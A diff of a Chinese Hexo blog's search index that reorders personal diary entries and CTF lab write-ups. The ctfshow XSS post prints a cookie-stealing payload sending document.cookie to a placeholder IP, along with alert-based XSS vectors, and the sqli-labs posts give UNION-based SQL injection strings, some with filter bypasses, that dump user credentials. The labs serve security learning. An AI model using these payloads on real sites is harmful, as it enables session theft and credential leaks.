+<h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p>
+<p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -283,15 +284,14 @@
       </tags>
   </entry>
   <entry>
-    <title>普通且自信</title>
-    <url>/2022/11/18/Diary_1118/</url>
-    <content><![CDATA[<p><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B51.png" alt="犬山葵"></p>
+    <title>平水远矣</title>
+    <url>/2022/11/19/Diary_1119/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_4.png" alt="凉宫春日&amp;长门有希"></p>
 <span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一天的学习还是挺充实的，平静的生活。</p>
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>长风破浪会有时，直挂云帆济沧海。</p>
-<h1 id="行路难"><a href="#行路难" class="headerlink" title="行路难"></a>行路难</h1><p>这样的日子，独自的世界。<br>是枯燥的吗？是斑斓的吗？让人多想的时候，就不禁觉得，热情会被拉扯而消散。<br>还是少想一些吧，多做事。<br>今天突然想到了一个短语，大概是最近几年流行的？ 普通且自信<br>其实原本都没怎么在意过这个词，是被某人用在我身上贬我的时候，才注意到的。<br>似乎在网络上被人作为贬义而广泛使用。但其实，我个人而言，还蛮喜欢这个短语的。<br>说起来，什么是普通呢？<br>我想，当某人拥有某一方面的长处时，或许有人会认为他不普通。但这其实只是就这方面而言，其他不是长处的方面，不也很普通吗？<br>如果说，崭露头角的人是不普通的，那么衡量标准就成为了一个人在这世界上的名气，那岂不是“不普通”&#x3D;“名气大”吗？我也并不这么认为。<br>浅浅的思考了之后，给出一个暂时的答案吧。<br>我心中的不普通的人，一种是有智慧wisdom的人，另一种是在某一方面处于超脱常人（在整个世界上来衡量）的人。这后一种的不普通，就不一定是好的形容了。<br>自信，我认为在认为时候都不应当是贬义词，与自信相对的贬义词并不是没有：过度自信是自负，没有自信是自卑。</p>
-<p>普通且自信，这个标签，也许还不错？<br>即便有人用这个词来贬我，我恐怕也只会报之一笑吧。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>每次碍于时间，想写什么，都不敢写深入，抽个时间，写点深刻的文字吧。</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>糟糕的一天</p>
+<h1 id="兜兜转转"><a href="#兜兜转转" class="headerlink" title="兜兜转转"></a>兜兜转转</h1><p>今天一天什么都没玩，但我感觉非常地不好，没学到多少东西。就像绕着一个圈子一直在兜兜转转，没啥好说的，明早早起。<br>今天是World Cup(世界杯)开幕式来着，我倒是没什么兴趣，就这样吧。</p>
+<h1 id="平水远矣"><a href="#平水远矣" class="headerlink" title="平水远矣"></a>平水远矣</h1><p>人生就像一碗盛满的水，唯有把水端平，才走得远。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>赶紧早点睡咯</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -402,6 +402,25 @@
       </tags>
   </entry>
   <entry>
+    <title>年末月初</title>
+    <url>/2022/12/01/Diary_1201/</url>
+    <content><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p>
+<span id="more"></span>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天发生了许多事，我却觉得有一种新鲜感。</p>
+<h1 id="降临"><a href="#降临" class="headerlink" title="降临"></a>降临</h1><p>本来周围一直没有什么阳性，从疫情出现以来。<br>不过嘛，根据墨菲定律，也是该发生一回了。<br>我一直没有经历过，网传很多也遥远得像另一星球发生的故事让我不知该作何反应。<br>于是这一天终于到来了，昨天本来要打算出门了，但周围人口耳相传的消息总算是敲了敲我的外壳，似乎是告诉我“今天的报纸送到了哦。”<br>我自然也如老大爷般喝着茶波澜不惊地看着报纸，仿佛一切都是国际新闻--与我无关。<br>直到发现另一寝室的人跑去抢购食品了我才意识到，情况似乎有点严重？尽管如此，过了一会儿还是悠哉游哉地去食堂吃晚餐了。<br>周围一人欲出校门未果，遂转来投奔于我。饭饱之后兴致大发，逛一逛许久没走过的“河山”。探到通往外面的幽径，便心满意足地回去了。<br>最终也没有如猜测中封寝，大概是防疫管控的松口还是有那么一些效果，变得稍微有了个人样。<br>这便是昨天的故事。<br>今日未到该到的地点，早上的腾讯会议只是伴我继续睡觉。又有新阳性的出现为这个小小的地方平添了恐慌等的负面情绪。接下来，又会如何呢？</p>
+<h1 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h1><p>在这个事上，上面的人对下面的人以及网络都在隐瞒。恐怕是害怕事情闹大，管控不住舆论，最终导致自己承担罪责，担当替罪羊，丢掉乌纱帽。这便是常态，或许任何一个人都会感到这件事上的荒谬，经历得多了却容易让人麻木。或许很多人都会感到恐慌气愤不解吧，可是我没什么感觉，为许许多多事愤怒过，最终平息了。即便是盛大的火山，也终有喷发完之时。这是自然规律，人也遵循人性规律。可唯有打破这种人性，才能突破桎梏，做一个痛苦的“人”。<br>产生的这些负面情绪，得不到发泄的地方，最终会造成一件事，信任缺失。上面的人从一开始就没有信任下面的人，对下面的人公布真实情况。这也必然造成下面的人无法信任上面的人。互相之间信任度越来越低，倘若得不到缓解终有一天会物极必反。首先从管理配合上会让校方付出更多成本代价，其次矛盾冲突也会慢慢上升，双方之间的隔阂也会逐渐加剧。往后会如何我并不可知，也不屑于知道。<br>悲哀的是，掌握大权却没有下面的人的制约，几乎没有什么办法改善。这些人能如何呢？以头抢地耳！<br>很明显，在这个囚徒困境中，上面的人是最先背叛的那一方。那么自然也是问题最大的一方。<br>就这样吧，2点过了。</p>
+<h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>不知老之将至</title>
     <url>/2022/12/10/Diary_1202/</url>
     <content><![CDATA[<p><img src="/images/%E8%99%B9%E5%A4%8F_1.png" alt="虹夏"></p>
@@ -413,25 +432,6 @@
 <h1 id="学习方面"><a href="#学习方面" class="headerlink" title="学习方面"></a>学习方面</h1><p>需要用更多精力去看web安全方面的内容。<br>不过学得太浅了，怎么说呢？看视频和博客，再自己写博客。也没怎么练习，很多东西一知半解，让我觉得轻飘飘的，看似把知识学进脑中，实则什么也不会。这种感觉很不好受。<br>还是需要，看视频，毕竟这样印象要深一些，而且必须要多进行实际练习，比如ctf，漏洞复现之类的。我将把大部分精力都放在实际练习上，知识的东西如果不会有效运用，终究是无趣的教条。<br>一个人住在房子里，感觉自己就像在闭关修炼，其实感觉还不错？</p>
 <h1 id="幸福的联系"><a href="#幸福的联系" class="headerlink" title="幸福的联系"></a>幸福的联系</h1><p>今天有人向我寻求问题的解答，大致是关于恋爱的事。<br>说着说着就谈到了幸福的问题。那人认为，幸福是每个人自己的，也即每个人的幸福是分开的，并不具有很强的联系。如果自己的幸福最大化，常常也会减损他人的幸福，也即是一种互斥的关系。<br>可在我看来，只有自己幸福最大化，才能让身边的人幸福。越是亲近的人，越会因我的幸福而变得幸福。也就是说，每个人的幸福之间具有很强的联系。倘若让他人伴我共赴地狱能使我幸福，那我会毫不犹豫邀请。因为我的幸福，即为我亲近之人的幸福。<br>常见的例子还有父母与孩子之间，孩子的幸福是父母的幸福。<br>但这个问题也是一个复杂的问题，比如身边的人关系亲疏是到什么程度，才会符合自己的幸福会给他人带来幸福？还有是些什么样的情形才符合？很多方面仍需思考，还不成熟。慢慢思考，以后专门写一篇文章吧。</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我们都在等待，等待着别人来拯救我们自己。 --列夫·托尔斯泰</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>年末月初</title>
-    <url>/2022/12/01/Diary_1201/</url>
-    <content><![CDATA[<p><img src="/images/12.jpg" alt="彼岸花"></p>
-<span id="more"></span>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这几天发生了许多事，我却觉得有一种新鲜感。</p>
-<h1 id="降临"><a href="#降临" class="headerlink" title="降临"></a>降临</h1><p>本来周围一直没有什么阳性，从疫情出现以来。<br>不过嘛，根据墨菲定律，也是该发生一回了。<br>我一直没有经历过，网传很多也遥远得像另一星球发生的故事让我不知该作何反应。<br>于是这一天终于到来了，昨天本来要打算出门了，但周围人口耳相传的消息总算是敲了敲我的外壳，似乎是告诉我“今天的报纸送到了哦。”<br>我自然也如老大爷般喝着茶波澜不惊地看着报纸，仿佛一切都是国际新闻--与我无关。<br>直到发现另一寝室的人跑去抢购食品了我才意识到，情况似乎有点严重？尽管如此，过了一会儿还是悠哉游哉地去食堂吃晚餐了。<br>周围一人欲出校门未果，遂转来投奔于我。饭饱之后兴致大发，逛一逛许久没走过的“河山”。探到通往外面的幽径，便心满意足地回去了。<br>最终也没有如猜测中封寝，大概是防疫管控的松口还是有那么一些效果，变得稍微有了个人样。<br>这便是昨天的故事。<br>今日未到该到的地点，早上的腾讯会议只是伴我继续睡觉。又有新阳性的出现为这个小小的地方平添了恐慌等的负面情绪。接下来，又会如何呢？</p>
-<h1 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h1><p>在这个事上，上面的人对下面的人以及网络都在隐瞒。恐怕是害怕事情闹大，管控不住舆论，最终导致自己承担罪责，担当替罪羊，丢掉乌纱帽。这便是常态，或许任何一个人都会感到这件事上的荒谬，经历得多了却容易让人麻木。或许很多人都会感到恐慌气愤不解吧，可是我没什么感觉，为许许多多事愤怒过，最终平息了。即便是盛大的火山，也终有喷发完之时。这是自然规律，人也遵循人性规律。可唯有打破这种人性，才能突破桎梏，做一个痛苦的“人”。<br>产生的这些负面情绪，得不到发泄的地方，最终会造成一件事，信任缺失。上面的人从一开始就没有信任下面的人，对下面的人公布真实情况。这也必然造成下面的人无法信任上面的人。互相之间信任度越来越低，倘若得不到缓解终有一天会物极必反。首先从管理配合上会让校方付出更多成本代价，其次矛盾冲突也会慢慢上升，双方之间的隔阂也会逐渐加剧。往后会如何我并不可知，也不屑于知道。<br>悲哀的是，掌握大权却没有下面的人的制约，几乎没有什么办法改善。这些人能如何呢？以头抢地耳！<br>很明显，在这个囚徒困境中，上面的人是最先背叛的那一方。那么自然也是问题最大的一方。<br>就这样吧，2点过了。</p>
-<h1 id="灵感"><a href="#灵感" class="headerlink" title="灵感"></a>灵感</h1><p>有时候写点东西，有灵感，便如洪水般涌出。没有灵感的时候，想挤点啥都困难呢。而我写了这么多日记，今天是第一次感觉自己有点灵感。碍于时间也只能匆匆结束。<br>曾想象自己是一个作家，也许每天都在挤榨自己脑海里的一点油墨吧。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我想看书的啊，又到这个时候了，烦诶。<br>明天一定要看叔本华的 <strong>作为意志和表象的世界</strong>！</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -1518,26 +1518,6 @@ gopher发送get请求</li>
       </tags>
   </entry>
   <entry>
-    <title>ctfshow-web入门-XSS</title>
-    <url>/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。<br>如果想拿flag，需要在相应环境下使用类似于以下的语句：<br><code>&lt;body onload=&quot;window.open(&#39;http://IP/&#39;+document.cookie)&quot;&gt;</code></p>
-<span id="more"></span>
-<h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>几乎没有任何限制，直接<br><code>&lt;script&gt;alert(0)&lt;/alert&gt;</code><br>或者使用img标签<br><code>&lt;img src=1 onerror=alert(0)&gt;</code><br>或者使用body标签：<br><code>&lt;body onload=&quot;alert(0)&quot;&gt;</code><br>或者使用svg标签：<br><code>&lt;svg onload=&quot;alert(0)&quot;&gt;</code><br>或者使用input标签：<br><code>&lt;input onfocus=&quot;alert(0)&quot; autofocus&gt;</code><br>或者使用video标签：<br><code>&lt;video onloadstart=&quot;alert(0)&quot; src=1 /&gt;</code><br>或者使用style标签：<br><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code><br>或者使用iframe标签：<br><code>&lt;iframe onload=&quot;alert(0)&quot;&gt;</code></p>
-<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script标签</p>
-<h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>增加过滤了a标签和img标签</p>
-<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>增加过滤了style标签</p>
-<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>除了以上的过滤之外，还对video也对空格进行了过滤，使用 <code>/</code> 代替空格绕过即可，比如：<br><code>&lt;iframe/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;input/onfocus=&quot;alert(0)&quot;/autofocus&gt;</code><br><code>&lt;body/onload=&quot;alert(0)&quot;&gt;</code></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>XSS</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS跨站脚本漏洞</title>
     <url>/2022/12/02/XSS/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>终于来到了XSS，来这一关之前把js重学了一遍，又把千锋关于XSS的视频也看了一遍，至此才敢写下这篇。</p>
@@ -1756,6 +1736,26 @@ gopher发送get请求</li>
         <category>XSS</category>
       </categories>
       <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-web入门-XSS</title>
+    <url>/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。<br>如果想拿flag，需要在相应环境下使用类似于以下的语句：<br><code>&lt;body onload=&quot;window.open(&#39;http://IP/&#39;+document.cookie)&quot;&gt;</code></p>
+<span id="more"></span>
+<h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>几乎没有任何限制，直接<br><code>&lt;script&gt;alert(0)&lt;/alert&gt;</code><br>或者使用img标签<br><code>&lt;img src=1 onerror=alert(0)&gt;</code><br>或者使用body标签：<br><code>&lt;body onload=&quot;alert(0)&quot;&gt;</code><br>或者使用svg标签：<br><code>&lt;svg onload=&quot;alert(0)&quot;&gt;</code><br>或者使用input标签：<br><code>&lt;input onfocus=&quot;alert(0)&quot; autofocus&gt;</code><br>或者使用video标签：<br><code>&lt;video onloadstart=&quot;alert(0)&quot; src=1 /&gt;</code><br>或者使用style标签：<br><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code><br>或者使用iframe标签：<br><code>&lt;iframe onload=&quot;alert(0)&quot;&gt;</code></p>
+<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script标签</p>
+<h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>增加过滤了a标签和img标签</p>
+<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>增加过滤了style标签</p>
+<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>除了以上的过滤之外，还对video也对空格进行了过滤，使用 <code>/</code> 代替空格绕过即可，比如：<br><code>&lt;iframe/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;input/onfocus=&quot;alert(0)&quot;/autofocus&gt;</code><br><code>&lt;body/onload=&quot;alert(0)&quot;&gt;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
         <tag>XSS</tag>
       </tags>
   </entry>
@@ -2766,6 +2766,42 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_20</title>
+    <url>/2022/11/15/sqli-labs_20/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
+</li>
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
+<p>报错，说明字段数为3</p>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若问我为什么知道这么做，我只能说，在网上看来的。( ╯□╰ )</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_21+22</title>
     <url>/2022/11/15/sqli-labs_21+22/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关开始用到加解密了</p>
@@ -2885,42 +2921,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_20</title>
-    <url>/2022/11/15/sqli-labs_20/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
-</li>
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
-<p>报错，说明字段数为3</p>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若问我为什么知道这么做，我只能说，在网上看来的。( ╯□╰ )</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_25+25a</title>
     <url>/2022/11/17/sqli-labs_25+25a/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
@@ -3020,6 +3020,48 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_28</title>
+    <url>/2022/11/17/sqli-labs_28+28a/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
+<span id="more"></span>
+
+<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
+<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
+</ol>
+<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
+<li><p>猜解SQL查询语句中的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>爆出显示位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_27+27a</title>
     <url>/2022/11/17/sqli-labs_27+27a/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
@@ -3090,48 +3132,6 @@ message.php页面<figure class="highlight php"><table><tr><td class="code"><pre>
 <h2 id="第30关"><a href="#第30关" class="headerlink" title="第30关"></a>第30关</h2><p>与第29关差不多，只是闭合方式从’变更为”</p>
 <h2 id="第31关"><a href="#第31关" class="headerlink" title="第31关"></a>第31关</h2><p>与第29关差不多，只是闭合方式从”变更为”)</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是，知道怎么做，注入方式就那几样，常规注入，报错注入，布尔盲注，时间盲注，抓包注入…</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
